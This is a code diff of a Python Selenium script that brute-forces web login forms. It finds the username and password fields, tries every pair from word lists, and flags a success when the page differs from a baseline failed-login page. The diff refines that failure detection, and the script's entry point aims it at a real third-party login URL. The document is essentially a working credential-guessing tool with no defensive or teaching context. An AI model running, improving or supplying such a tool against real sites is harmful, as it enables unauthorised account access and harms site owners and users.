@@ -1,9 +1,8 @@
 import time
 import re
 import difflib
-
+import random
 from selenium import webdriver
-# from selenium.webdriver.common.keys import Keys
 import requests
 from selenium.webdriver.common.by import By
 from config.config import captcha_keyword_list
@@ -26,6 +25,10 @@ password_list = list()
 
 def string_similar(s1, s2):
     return difflib.SequenceMatcher(None, s1, s2).quick_ratio()
+
+
+def random_string(num):
+    return "".join(random.sample("zyxwvutsrqponmlkjihgfedcba", num))
 
 
 # 初始化浏览器，加入防爬绕过
@@ -98,14 +101,78 @@ def check_flag(_browser):
             except:
                 pass
     if u_flag and p_flag:
-        _browser.quit()
+        # _browser.quit()
         return u_flag, p_flag
     else:
-        _browser.quit()
+        # _browser.quit()
         return None, None
 
 
-def crack(user_flag, pass_flag, username, password, url):
+def check_response(_browser, user_flag, pass_flag, before_page):
+    clicks_num = None
+    try:
+        if user_flag[1] == 'str':
+            _browser.find_element(By.NAME, user_flag[0]).send_keys(random_string(5))
+        if user_flag[1] == 'xpath':
+            _browser.find_element(By.XPATH, user_flag[0]).send_keys(random_string(5))
+        if pass_flag[1] == 'str':
+            _browser.find_element(By.NAME, pass_flag[0]).send_keys(random_string(5))
+        if pass_flag[1] == 'xpath':
+            _browser.find_element(By.XPATH, pass_flag[0]).send_keys(random_string(5))
+        # if 'type="submit"' in before_page:
+        #     _browser.find_element(By.CSS_SELECTOR, '[type=submit]').click()
+        # elif 'type="button"' in before_page:
+        #     _browser.find_element(By.CSS_SELECTOR, '[type=button]').click()
+        # else:
+        #     _browser.find_element(By.CSS_SELECTOR, 'button').click()
+        if re.findall('<input class="(.*?)" type="button"', before_page):
+            clicks = _browser.find_elements(By.CSS_SELECTOR, 'input')
+            for click in clicks:
+                if click.tag_name == 'input':
+                    clicks_num = 'input'
+                    break
+        if re.findall('<button(.*?)"', before_page):
+            clicks = _browser.find_elements(By.CSS_SELECTOR, 'button')
+            for click in clicks:
+                if click.tag_name == 'button':
+                    clicks_num = 'button'
+                    break
+        if clicks_num is None:
+            if 'type="submit"' in before_page:
+                _browser.find_element(By.CSS_SELECTOR, '[type=submit]').click()
+            elif 'type="button"' in before_page:
+                _browser.find_element(By.CSS_SELECTOR, '[type=button]').click()
+            else:
+                _browser.find_element(By.CSS_SELECTOR, 'button').click()
+            time.sleep(3)
+            later_page = _browser.page_source
+            _browser.quit()
+            return later_page
+            # print(string_similar(later_page, before_page))
+            # if string_similar(later_page, before_page) < 0.8:
+            #     print(f'[+] 登陆密码: {username},{password},url:{url}')
+            #     _browser.quit()
+        else:
+            # for click in clicks_num:
+            clicks = _browser.find_elements(By.CSS_SELECTOR, clicks_num)
+            for c in clicks:
+                if any(l in c.accessible_name for l in ['登', 'Login', 'login', 'LOGIN', 'sign up', 'Sign Up']):
+                    c.click()
+                    break
+            time.sleep(3)
+            later_page = _browser.page_source
+            # print(string_similar(later_page, before_page))
+            # if string_similar(later_page, before_page) < 0.8:
+            #     print(f'[+] 登陆密码: {username},{password},url:{url}')
+            #     _browser.quit()
+            _browser.quit()
+            return later_page
+    except Exception as e:
+        print(e)
+        _browser.quit()
+
+
+def crack(user_flag, pass_flag, username, password, url, mistaken_page):
     if success1 == 0:
         print(f'[*]正在尝试 {username},{password} url:{url}')
         _browser = get_driver()
@@ -140,7 +207,7 @@ def crack(user_flag, pass_flag, username, password, url):
                     if click.tag_name == 'button':
                         clicks_num = 'button'
                         break
-            if len(clicks_num) <= 1:
+            if clicks_num is None:
                 if 'type="submit"' in before_page:
                     _browser.find_element(By.CSS_SELECTOR, '[type=submit]').click()
                 elif 'type="button"' in before_page:
@@ -149,8 +216,7 @@ def crack(user_flag, pass_flag, username, password, url):
                     _browser.find_element(By.CSS_SELECTOR, 'button').click()
                 time.sleep(3)
                 later_page = _browser.page_source
-                print(string_similar(later_page, before_page))
-                if string_similar(later_page, before_page) < 0.8:
+                if string_similar(later_page, mistaken_page) < 0.8:
                     print(f'[+] 登陆密码: {username},{password},url:{url}')
                     _browser.quit()
                 _browser.quit()
@@ -163,12 +229,12 @@ def crack(user_flag, pass_flag, username, password, url):
                         break
                 time.sleep(3)
                 later_page = _browser.page_source
-                print(string_similar(later_page, before_page))
-                if string_similar(later_page, before_page) < 0.8:
+                if string_similar(later_page, mistaken_page) < 0.8:
                     print(f'[+] 登陆密码: {username},{password},url:{url}')
                     _browser.quit()
                 _browser.quit()
         except Exception as e:
+            print(e)
             _browser.quit()
         # time.sleep(3)
         # later_page = _browser.page_source
@@ -200,22 +266,25 @@ def run(url):
     browser = get_driver()
     browser.maximize_window()
     browser.get(url)
+    source_page = browser.page_source
     # browser.implicitly_wait()
     user_flag, pass_flag = check_flag(browser)
     if user_flag is None or pass_flag is None:
         print('[!] 无法识别表单请手动添加')
         browser.quit()
         return
+    mistaken_page = check_response(browser, user_flag, pass_flag, source_page)
+    browser.quit()
     new_loop = asyncio.new_event_loop()
     asyncio.set_event_loop(new_loop)
     loop = asyncio.get_event_loop()
     executor = ThreadPoolExecutor(1)
     for username in username_list:
         for password in password_list:
-            tasks.append(loop.run_in_executor(executor, crack, user_flag, pass_flag, username, password, url))
+            tasks.append(loop.run_in_executor(executor, crack, user_flag, pass_flag, username, password, url, mistaken_page))
     loop.run_until_complete(asyncio.wait(tasks))
     loop.close()
-    browser.quit()
 
-if __name__=='__main__':
-    run('https://www.baidu.com/')
+
+if __name__ == '__main__':
+    run('http://www.baidu.com/login')
